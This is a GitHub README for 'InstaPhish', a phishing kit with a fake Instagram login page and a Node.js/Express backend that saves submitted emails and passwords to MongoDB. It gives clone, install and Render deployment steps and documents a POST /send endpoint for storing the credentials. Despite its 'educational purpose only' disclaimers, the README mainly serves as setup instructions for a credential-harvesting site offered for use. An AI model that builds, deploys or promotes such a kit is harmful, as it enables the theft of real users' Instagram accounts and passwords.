
# 📸 InstaPhish - Instagram Credential Collector (Educational Purpose Only)

InstaPhish is a simple full-stack web application that mimics a fake Instagram login page to collect user credentials. This project is created **strictly for educational and ethical hacking demonstrations only** — to raise awareness about phishing attacks and how easily users can be tricked.

> ❗ **Disclaimer**: This project is intended for cybersecurity education, ethical hacking awareness, and research purposes only. Misuse of this project for illegal or unethical purposes is strictly prohibited.

---

## 🚀 Features

- Fake Instagram login UI (static HTML/CSS)
- Node.js + Express backend
- MongoDB integration to store credentials
- Hosted on Render (backend) and optionally Netlify/Vercel (frontend)
- API endpoint: `POST /send`

---

## 🧠 Tech Stack

| Technology    | Use                           |
|---------------|--------------------------------|
| HTML, CSS     | Frontend (fake login page)     |
| Node.js       | Backend runtime                |
| Express.js    | Web server and routing         |
| MongoDB       | NoSQL database                 |
| Mongoose      | MongoDB ODM for Node.js        |
| Render        | Deployment for backend         |

---

## 📁 Folder Structure

```
InstaPhish/
│
├── backend.js            # Express server code
├── db.js                 # Mongoose database connection & model
├── index.html            # Fake Instagram login page
├── public/               # Static assets (CSS, images)
├── package.json          # Node dependencies & scripts
└── README.md             # Project documentation
```

---

## ⚙️ Installation

1. **Clone the repo**:

```bash
git clone https://github.com/Axshatt/InstaPhish.git
cd InstaPhish
```

2. **Install dependencies**:

```bash
npm install
```

3. **Set up MongoDB**:

Update your MongoDB URI inside `db.js`:

```js
mongoose.connect('mongodb+srv://<username>:<password>@cluster0.mongodb.net/InstaPhishDB');
```

4. **Start the server**:

```bash
node backend.js
```

Server runs at: `http://localhost:3000/`

---

## 🌐 Deployment

### 🟦 Backend (Render)

1. Push code to GitHub
2. Go to [Render](https://render.com)
3. Create a new Web Service
4. Connect your repo
5. Set:
   - **Build command**: `npm install`
   - **Start command**: `node backend.js`
   - **Environment Variables**: `MONGODB_URI=<your-mongodb-url>`

---

## 📬 API Reference

### `POST /send`

Stores email and password in MongoDB.

**Request Body:**

```json
{
  "email": "example@gmail.com",
  "password": "123456"
}
```

**Response:**

```json
{
  "msg": "Credentials Saved"
}
```

---

## 📄 License

This project is released under the MIT License.

---

## 📛 Warning

This project simulates phishing attacks for **cybersecurity awareness and ethical education** only. Do **not** deploy this publicly without clear disclaimers and permissions. Unauthorized collection of user data is illegal and punishable under cybercrime laws.

---

## 🙌 Credits

Developed by [Akshat](https://github.com/Axshatt)  
Instagram Page: [@aksshh.exe](https://instagram.com/aksshh.exe)  
Portfolio: [bento.me/axshattt](https://bento.me/axshattt)
